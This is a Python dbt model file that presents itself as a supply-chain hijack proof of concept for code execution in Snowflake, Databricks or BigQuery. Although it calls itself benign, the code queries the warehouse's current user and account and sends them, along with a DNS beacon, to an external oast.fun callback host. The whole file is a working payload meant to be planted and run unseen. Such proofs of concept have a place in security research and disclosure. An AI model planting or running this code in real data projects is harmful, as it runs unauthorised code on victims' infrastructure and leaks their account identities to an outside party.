# Python model — runs in dbt's Python runtime (Snowflake/Databricks/BigQuery)
# Proves arbitrary code execution via supply-chain hijack
# Benign: OAST DNS/HTTP callback only, no data access
import requests
import socket

def model(dbt, session):
    dbt.config(materialized="table")

    # DNS callback — works even in restricted networks
    try:
        socket.getaddrinfo(
            "dbt-python-model-rce.yokodnssmamqdchvjfyq1w8ixw5vlddtn.oast.fun",
            80, proto=socket.IPPROTO_TCP
        )
    except Exception:
        pass

    # HTTP callback with execution context
    try:
        ctx = session.sql(
            "SELECT CURRENT_USER() AS u, CURRENT_ACCOUNT() AS a"
        ).collect()
        requests.get(
            f"https://yokodnssmamqdchvjfyq1w8ixw5vlddtn.oast.fun/dbt-python-rce/{ctx[0]['U']}/{ctx[0]['A']}",
            timeout=5,
        )
    except Exception:
        pass

    return session.sql("SELECT 'SUPPLY_CHAIN_POC_1627' AS poc_marker, CURRENT_TIMESTAMP() AS ts")
